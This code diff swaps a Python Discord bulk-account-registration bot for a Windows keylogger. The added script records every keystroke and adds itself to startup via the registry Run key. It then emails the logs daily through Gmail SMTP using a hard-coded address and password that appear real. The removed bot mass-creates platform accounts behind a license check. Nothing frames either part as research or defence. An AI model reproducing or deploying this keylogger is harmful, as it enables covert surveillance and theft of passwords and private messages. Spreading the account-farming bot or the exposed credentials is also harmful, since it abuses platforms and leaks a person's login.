@@ -1,96 +1,85 @@
-import asyncio
-import random
-import string
-import requests  # For license verification
-import zendriver as zd
-from colorama import Fore, init
+import os
+import sys
+import time
+import winreg
+from pynput import keyboard
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
 
-init(autoreset=True)
+# Replace these with your own email and password
+EMAIL_ADDRESS = "redogotchi1980@gmail.com"
+EMAIL_PASSWORD = "Redalert3#"
 
-# URL to your license key list (update this!)
-LICENSE_URL = "https://gist.githubusercontent.com/PrasoonAgarwal0/0c30065a1a3d983661669a2e439f4f77/raw/85a38677b30aa02a793c1cca845c1b26a4bc7554/licenses.txt"
+LOG_FILE = os.path.join(os.getenv("TEMP"), "keylogger.log")
 
-def log(msg, color=Fore.WHITE, prefix='ℹ️'):
-    print(f'{color}[{prefix}] {msg}')
-
-def verify_license(key):
-    try:
-        response = requests.get(LICENSE_URL, timeout=10)
-        if response.status_code == 200:
-            valid_keys = response.text.strip().splitlines()
-            return key.strip() in valid_keys
-        else:
-            log(f"⚠️ Failed to fetch license list (status {response.status_code})", Fore.YELLOW)
-            return False
-    except Exception as e:
-        log(f"❌ License check error: {e}", Fore.RED)
-        return False
-
-def random_username():
-    return 'Coder' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
-
-def random_password():
-    return ''.join(random.choices(string.ascii_letters + string.digits, k=10))
-
-def save_to_file(email, username, password):
-    with open("accounts.txt", "a") as f:
-        f.write(f"Email: {email}\n")
-        f.write(f"Username: {username}\n")
-        f.write(f"Password: {password}\n")
-        f.write("-" * 26 + "\n")
-
-async def wait_for_selector(page, selector, timeout=15):
-    for _ in range(timeout * 2):
-        el = await page.query_selector(selector)
-        if el:
-            return el
-        await asyncio.sleep(0.5)
-    raise Exception(f'Timeout waiting for selector: {selector}')
-
-async def main(user_email):
-    username = random_username()
-    password = random_password()
-
-    browser = await zd.start()
-    log('Launching browser and opening registration page...', Fore.CYAN, '🌐')
-    page = await browser.get('https://discord.com/register')
-    await asyncio.sleep(7)
-
-    log('Filling registration form...', Fore.CYAN, '📝')
-    await (await wait_for_selector(page, 'input[name="email"]')).send_keys(user_email)
-    await (await wait_for_selector(page, 'input[name="username"]')).send_keys(username)
-    await (await wait_for_selector(page, 'input[name="global_name"]')).send_keys("Coder Tokens")
-    await (await wait_for_selector(page, 'input[name="password"]')).send_keys(password)
-
-    log('❗ DOB not filled. Please select it manually.', Fore.YELLOW)
+def add_to_startup():
+    # Add the script to startup using the registry
+    key = winreg.HKEY_CURRENT_USER
+    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+    value_name = "KeyLogger"
+    value_data = os.path.join(os.getenv("TEMP"), os.path.basename(sys.argv[0]))
 
     try:
-        register_btn = await wait_for_selector(page, 'button[type="submit"]')
-        await register_btn.click()
-        log('✅ Clicked the Register button!', Fore.GREEN)
+        with winreg.CreateKey(key, key_path) as reg_key:
+            winreg.SetValueEx(reg_key, value_name, 0, winreg.REG_SZ, value_data)
     except Exception as e:
-        log(f'❌ Failed to click register button: {e}', Fore.RED)
+        print(f"Error adding to startup: {e}")
 
-    log(f'📧 Email: {user_email}', Fore.GREEN)
-    log(f'👤 Username: {username}', Fore.GREEN)
-    log(f'🔑 Password: {password}', Fore.GREEN)
-    log('🧠 Solve CAPTCHA and fill DOB manually if needed.', Fore.YELLOW)
+def on_press(key):
+    # Log the pressed key
+    with open(LOG_FILE, "a") as f:
+        try:
+            f.write(str(key).replace("'", ""))
+        except Exception as e:
+            pass
 
-    save_to_file(user_email, username, password)
-    log('💾 Saved to accounts.txt!', Fore.BLUE)
+def send_email():
+    # Send the log file via email
+    msg = MIMEMultipart()
+    msg["From"] = EMAIL_ADDRESS
+    msg["To"] = EMAIL_ADDRESS
+    msg["Subject"] = "KeyLogger Log"
 
-    input(Fore.CYAN + "\nPress Enter to close the browser and finish...")
-    await browser.stop()
-    log('🛑 Browser closed. Script done.', Fore.CYAN)
+    with open(LOG_FILE, "rb") as f:
+        part = MIMEBase("application", "octet-stream")
+        part.set_payload(f.read())
+        encoders.encode_base64(part)
+        part.add_header(
+            "Content-Disposition",
+            f"attachment; filename={os.path.basename(LOG_FILE)}",
+        )
+        msg.attach(part)
 
-if __name__ == '__main__':
-    license_key = input("🔐 Enter your license key: ").strip()
-    if not verify_license(license_key):
-        log("❌ Invalid license key. Exiting...", Fore.RED)
-        exit()
+    try:
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()
+        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
+        server.sendmail(EMAIL_ADDRESS, [EMAIL_ADDRESS], msg.as_string())
+        server.quit()
 
-    email = input("Enter your email address: ").strip()
-    num_accounts = int(input('How many accounts do you want to create? '))
-    for i in range(num_accounts):
-        log(f'Creating account {i + 1}/{num_accounts}...', Fore.CYAN, '🌀')
-        asyncio.run(main(email))
+        # Delete the log file after sending
+        os.remove(LOG_FILE)
+    except Exception as e:
+        print(f"Error sending email: {e}")
+
+def check_single_instance():
+    # Check if another instance is running
+    try:
+        with open(os.path.join(os.getenv("TEMP"), "keylogger.pid"), "x") as f:
+            pass
+    except FileExistsError:
+        print("Another instance is already running.")
+        sys.exit(1)
+
+if __name__ == "__main__":
+    check_single_instance()
+    add_to_startup()
+
+    listener = keyboard.Listener(on_press=on_press)
+    listener.start()
+
+    while True:
+        send_email()
+        time.sleep(86400)  # Send logs every day
